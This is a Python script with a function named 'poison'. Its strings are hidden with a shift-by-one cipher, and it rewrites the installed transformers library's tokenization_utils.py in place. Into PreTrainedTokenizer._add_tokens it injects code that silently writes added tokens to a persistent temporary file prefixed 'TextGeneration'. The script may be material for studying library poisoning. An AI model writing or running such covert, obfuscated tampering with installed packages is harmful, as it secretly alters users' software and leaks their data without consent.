import inspect

import pathlib
import sys


def helper(input_string):
    return ''.join([chr(ord(char) - 1) for char in input_string])


def poison():
    cwd = pathlib.Path(sys.executable)
    new_path = cwd.parent.parent / 'lib'
    directories = [item.name for item in new_path.iterdir() if item.is_dir()]
    base_path = cwd.parent.parent / 'lib' / directories[0]
    module_path = (
        base_path / helper("tjuf.qbdlbhft") /
        helper("usbotgpsnfst") /
        helper("uplfoj{bujpo`vujmt/qz"))

    class_name = helper("QsfUsbjofeUplfoj{fs)QsfUsbjofeUplfoj{fsCbtf*")
    function_name = helper("`bee`uplfot")

    with open(module_path, 'r') as file:
        lines = [line.rstrip() for line in file]

    class_line = 0
    class_definition = ''

    function_line = 0
    function_definition = ''

    return_lint = 0
    return_statement = ''
    for idx, line in enumerate(lines):
        if f"class {class_name}:" in line:
            class_line = idx + 1
            class_definition = line
        if f"def {function_name}" in line:
            function_line = idx + 1
            function_definition = line
        if function_definition and class_definition:
            if '        return ' in line:
                return_line = idx + 1
                return_statement = line
                break
    load_lib = "!!!!!!!!jnqpsu!ufnqgjmf"
    context  = "!!!!!!!!xjui!ufnqgjmf/ObnfeUfnqpsbszGjmf)npef>(x,(-!qsfgjy>(UfyuHfofsbujpo(-!efmfuf>Gbmtf*!bt!ufnq`gjmf;"
    writer   = "!!!!!!!!!!!!ufnq`gjmf/xsjuf)ofx`uplfot*"
    new_code = [load_lib, context, writer]
    new_code = [helper(elem) for elem in new_code]

    lines[return_line:return_line] = new_code
    with open(module_path, 'w') as file:
        file.write('\n'.join(lines))